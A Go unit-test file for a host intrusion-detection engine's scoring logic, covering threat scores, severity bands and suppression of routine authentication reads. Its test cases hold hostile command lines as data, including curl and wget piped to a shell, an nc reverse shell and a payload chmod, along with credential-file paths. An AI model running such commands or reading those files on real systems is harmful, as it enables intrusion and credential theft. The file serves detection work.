package score

import (
	"strings"
	"testing"
)

func TestScoreExec(t *testing.T) {
	cases := []struct {
		name    string
		binary  string
		args    string
		minWant int
	}{
		{"plain bash", "/bin/bash", "", 0},
		{"bash -c", "/bin/bash", "-c 'echo hi'", 1},
		{"curl plain", "/usr/bin/curl", "https://example.com", 3},
		{"curl pipe sh", "/usr/bin/curl", "-fsSL https://x.example.com | sh", 25},
		{"wget pipe bash", "/usr/bin/wget", "-qO- https://x | bash", 25},
		{"nc reverse shell", "/usr/bin/nc", "-e /bin/bash 1.2.3.4 4444", 20},
		{"nc plain", "/usr/bin/nc", "-l 8080", 5},
		{"base64 decode", "/bin/bash", "-c 'echo aGk= | base64 -d'", 15},
		{"chmod +x", "/usr/bin/chmod", "+x /tmp/payload", 5},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, _, _ := Score("process_exec", tc.binary, tc.args, "", 0)
			if got < tc.minWant {
				t.Fatalf("got=%d want>=%d", got, tc.minWant)
			}
		})
	}
}

func TestScoreKprobe(t *testing.T) {
	cases := []struct {
		name    string
		policy  string
		args    string
		wantMin int
	}{
		{"privilege-escalation", "privilege-escalation", "0", 15},
		{"shadow access", "sensitive-file-access", "/etc/shadow", 20},
		{"ssh access", "sensitive-file-access", "/root/.ssh/id_rsa", 20},
		{"sudoers access", "sensitive-file-access", "/etc/sudoers", 8},
		{"outbound", "outbound-connections", "", 12},
		{"unknown", "no-such-policy", "", 0},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, _, _ := Score("process_kprobe", "/bin/bash", tc.args, tc.policy, 0)
			if got < tc.wantMin {
				t.Fatalf("got=%d want>=%d", got, tc.wantMin)
			}
		})
	}
}

func TestSeverity(t *testing.T) {
	cases := []struct {
		score int
		want  string
	}{
		{0, "info"},
		{4, "info"},
		{5, "low"},
		{9, "low"},
		{10, "medium"},
		{19, "medium"},
		{20, "high"},
		{39, "high"},
		{40, "critical"},
		{999, "critical"},
	}
	for _, tc := range cases {
		if got := Severity(tc.score); got != tc.want {
			t.Errorf("Severity(%d)=%q want %q", tc.score, got, tc.want)
		}
	}
}

func TestUnknownEventType(t *testing.T) {
	got, _, _ := Score("not_a_thing", "/bin/bash", "", "", 0)
	if got != 0 {
		t.Fatalf("unknown event type should score 0, got %d", got)
	}
}

// The credential policy had no case in scoreKprobe at all, so every event it
// produced scored 0 and never raised an alert. Verified against the live rig:
// a read of ~/.aws/credentials produced no alerts in the same command where
// /etc/shadow produced four.
func TestCredentialStoreReadIsScored(t *testing.T) {
	for _, path := range []string{
		"/home/ubuntu/.aws/credentials",
		"/home/ubuntu/.kube/config",
		"/home/ubuntu/.gnupg/secring.gpg",
		"/home/ubuntu/.netrc",
		"/etc/gshadow",
	} {
		got, reason, _ := Score("process_kprobe", "/bin/cat", path+" 4", "override-credential-read", 0)
		if got <= 0 {
			t.Fatalf("%s scored %d — credential theft would raise no alert", path, got)
		}
		if reason == "" {
			t.Fatalf("%s scored %d with no reason — an alert with no description is not triageable", path, got)
		}
	}
}

// The mask the policy matched on was being joined into the args and ending up
// verbatim in the description ("Sensitive file accessed: /etc/passwd 4").
func TestDescriptionDoesNotLeakTheArgMask(t *testing.T) {
	for _, policy := range []string{"sensitive-file-access", "override-credential-read"} {
		_, reason, _ := Score("process_kprobe", "/bin/cat", "/etc/shadow 4", policy, 0)
		if strings.HasSuffix(reason, " 4") || strings.Contains(reason, "shadow 4") {
			t.Fatalf("%s leaked the permission mask into the description: %q", policy, reason)
		}
	}
}

// Band must order the same way Severity labels do, or alerting on an increase
// in band would not correspond to an increase in reported severity.
func TestBandOrderingMatchesSeverity(t *testing.T) {
	cases := []struct {
		score int
		band  int
		sev   string
	}{{0, 0, "info"}, {5, 1, "low"}, {10, 2, "medium"}, {20, 3, "high"}, {40, 4, "critical"}, {179, 4, "critical"}}
	for _, c := range cases {
		if got := Band(c.score); got != c.band {
			t.Fatalf("Band(%d)=%d want %d", c.score, got, c.band)
		}
		if got := Severity(c.score); got != c.sev {
			t.Fatalf("Severity(%d)=%q want %q", c.score, got, c.sev)
		}
	}
	for i := 1; i < 200; i++ {
		if Band(i) < Band(i-1) {
			t.Fatalf("Band is not monotonic at %d", i)
		}
	}
}

// The engine raised 6,808 alerts in 24h against 109 the day before, and the
// difference was operators logging in. These pin the suppression that fixed it.

func TestAuthStackCredentialReadIsNotAFinding(t *testing.T) {
	cases := []struct {
		name, binary, parent string
	}{
		{"ssh login", "/usr/sbin/unix_chkpwd", "/usr/lib/openssh/sshd-session"},
		{"ssh auth split", "/usr/sbin/unix_chkpwd", "/usr/lib/openssh/sshd-auth"},
		{"rhel layout", "/usr/sbin/unix_chkpwd", "/usr/libexec/openssh/sshd-session"},
		{"sudo", "/usr/sbin/unix_chkpwd", "/usr/bin/sudo"},
		{"su", "/usr/sbin/unix_chkpwd", "/bin/su"},
		{"console login", "/usr/sbin/unix_chkpwd", "/usr/bin/login"},
		{"sbin spelling", "/sbin/unix_chkpwd", "/usr/bin/sudo"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if !IsAuthStackCredentialRead(tc.binary, tc.parent, "sensitive-file-access") {
				t.Fatalf("%s → %s reading /etc/shadow must not score: it is what PAM does on every authentication",
					tc.parent, tc.binary)
			}
		})
	}
}

// The parent is NOT reliable and must not be required.
//
// Measured after the first deploy of this rule: unix_chkpwd arrived with a
// parent of "/proc/self/fd/9" (an fd re-exec), so a pair-match missed it and
// the chain scored 57 critical. The read is definitional whatever launched it —
// unix_chkpwd verifies a password the caller already supplied and never
// discloses the file. An unusual LINEAGE is still caught, by the behavioural
// baseline, which is the layer that can actually answer that question.
func TestAuthHelperIsSuppressedWhateverTheParent(t *testing.T) {
	for _, parent := range []string{"/proc/self/fd/9", "/bin/bash", "/tmp/dropper", ""} {
		if !IsAuthStackCredentialRead("/usr/sbin/unix_chkpwd", parent, "sensitive-file-access") {
			t.Fatalf("unix_chkpwd under parent %q must not score: the read discloses nothing", parent)
		}
	}
}

// The login binaries run PAM in-process and read the shadow file themselves —
// there is no helper and no pair to match. These chains scored 108 and 40 on
// every SSH login until the rule matched on the reader.
func TestLoginStackReadingCredentialsItselfIsSuppressed(t *testing.T) {
	for _, bin := range []string{
		"/usr/lib/openssh/sshd-session",
		"/usr/lib/openssh/sshd-auth",
		"/usr/libexec/openssh/sshd-session",
		"/usr/sbin/sshd",
		"/usr/bin/login",
		"/usr/bin/su",
	} {
		if !IsAuthStackCredentialRead(bin, "/usr/lib/systemd/systemd", "sensitive-file-access") {
			t.Errorf("%s reading /etc/shadow is PAM in-process and must not score", bin)
		}
	}
}

// Privilege-separation setuid is suppressed — but ONLY now that sudo's setuid
// actually lands on its chain (eventpipe synthesises the forked child's node).
// The first attempt at this shipped without that and took the live detection
// suite from 15/15 to 14/15.
func TestRoutinePrivilegeTransitionsAreSuppressed(t *testing.T) {
	for _, bin := range []string{
		"/usr/lib/openssh/sshd-auth",
		"/usr/lib/openssh/sshd-session",
		"/usr/sbin/unix_chkpwd",
		"/usr/lib/systemd/systemd-executor",
		"/usr/bin/runc",
		"/usr/sbin/cron",
	} {
		if !IsRoutinePrivilegeTransition(bin, "privilege-escalation") {
			t.Errorf("setuid(0) by %s is privilege separation, not escalation", bin)
		}
	}
}

// THE REGRESSION GUARD. sudo, su, pkexec and newgrp are the T1548 surface. If
// any of these is ever added to routinePrivilegeTransitions, the platform loses
// the technique entirely — which is exactly what happened once, silently,
// because the suite was passing on the harness's own ssh login.
func TestElevationBinariesAreNeverSuppressed(t *testing.T) {
	for _, bin := range []string{"/usr/bin/sudo", "/bin/sudo", "/usr/bin/su", "/bin/su", "/usr/bin/pkexec", "/usr/bin/newgrp"} {
		if IsRoutinePrivilegeTransition(bin, "privilege-escalation") {
			t.Fatalf("setuid(0) by %s MUST score — it is the whole of T1548 coverage", bin)
		}
		got, _, _ := Score("process_kprobe", bin, "", "privilege-escalation", 0)
		if got != 15 {
			t.Fatalf("privilege-escalation for %s scored %d, want 15", bin, got)
		}
	}
}

// The suppression is scoped to the setuid policy. A credential read or an
// outbound connection from the same binary is a different signal.
func TestRoutineTransitionSuppressionIsScopedToSetuid(t *testing.T) {
	for _, policy := range []string{"sensitive-file-access", "outbound-connections", ""} {
		if IsRoutinePrivilegeTransition("/usr/bin/runc", policy) {
			t.Fatalf("policy %q must not be suppressed by the setuid rule", policy)
		}
	}
}

// The suppression is scoped to the two signals authentication actually
// produces: a credential-file read, and setuid(0) by a binary that exists to
// change uid. Everything else from the same binary is a different signal.
//
// This deliberately supersedes an earlier, narrower assertion that
// privilege-escalation was never suppressed. Live evidence changed the
// contract: sshd-auth calls setuid(0) on every SSH login, so that policy raised
// a HIGH per login on an estate with no attacker. The scope is now the
// setuidByDesign set, and TestSetuidFromAnythingElseStillScores pins the half
// that must not move.
func TestSuppressionIsScopedToAuthenticationSignals(t *testing.T) {
	// An outbound connection is never authentication, whoever made it.
	for _, policy := range []string{"outbound-connections", ""} {
		if IsAuthStackCredentialRead("/usr/sbin/unix_chkpwd", "/usr/bin/sudo", policy) {
			t.Fatalf("policy %q must not be suppressed", policy)
		}
	}
	// An auth binary making an outbound connection is a real finding: sshd
	// dialling out is not something authentication does.
	if IsAuthStackCredentialRead("/usr/lib/openssh/sshd-session", "", "outbound-connections") {
		t.Fatal("an outbound connection from sshd-session must still score")
	}
}

// systemd resolves `User=` in a unit file by reading the account databases,
// in a forked systemd-executor since v254. After the auth-stack and fd-resolve
// fixes it was the LAST remaining source of criticals on an idle host: eleven
// /etc/shadow reads per unit start, score 109. Same class as PAM.
func TestSystemdAccountDatabaseReadsAreSuppressed(t *testing.T) {
	for _, bin := range []string{
		"/usr/lib/systemd/systemd-executor",
		"/lib/systemd/systemd-executor",
		"/usr/lib/systemd/systemd",
		"/usr/lib/systemd/systemd-logind",
	} {
		if !IsAuthStackCredentialRead(bin, "", "sensitive-file-access") {
			t.Errorf("%s resolving User= from the account database must not score", bin)
		}
	}
	// The narrowing still holds: a unit that runs a shell which reads the
	// shadow file is a finding, because the READER is the shell.
	if IsAuthStackCredentialRead("/bin/bash", "/usr/lib/systemd/systemd-executor", "sensitive-file-access") {
		t.Fatal("a shell launched by systemd reading /etc/shadow must still score")
	}
}

// /etc/passwd was 55% of all alert volume on an idle host (111 of the newest
// 200, 80 from the container runtime), and pushed the posture dial to 98/100
// "Critical" with no attacker present. It is world-readable and holds no
// secrets.
func TestWorldReadablePasswdIsNotAFinding(t *testing.T) {
	got, reason, finding := Score("process_kprobe", "/usr/bin/runc", "/etc/passwd 4", "sensitive-file-access", 0)
	if got != 0 || reason != "" || finding != "" {
		t.Fatalf("/etc/passwd scored %d (%q/%q), want 0 — it is a public file", got, reason, finding)
	}
}

// The rest of the policy must be untouched. /etc/shadow is the credential
// store, /etc/sudoers says who may become root, and a honeypot read is
// malicious by construction because nothing legitimate opens a decoy.
func TestTheRestOfTheSensitiveFileTierIsUnchanged(t *testing.T) {
	cases := []struct {
		path string
		want int
	}{
		{"/etc/shadow", 20},
		{"/root/.ssh/id_rsa", 20},
		{"/etc/sudoers", 8},
		{"/var/lib/ebpf-engine/honey/_shadow", 8},
		{"/var/lib/ebpf-engine/honey/_passwd", 8},
	}
	for _, tc := range cases {
		got, _, _ := Score("process_kprobe", "/usr/bin/cat", tc.path+" 4", "sensitive-file-access", 0)
		if got != tc.want {
			t.Errorf("%s scored %d, want %d", tc.path, got, tc.want)
		}
	}
}
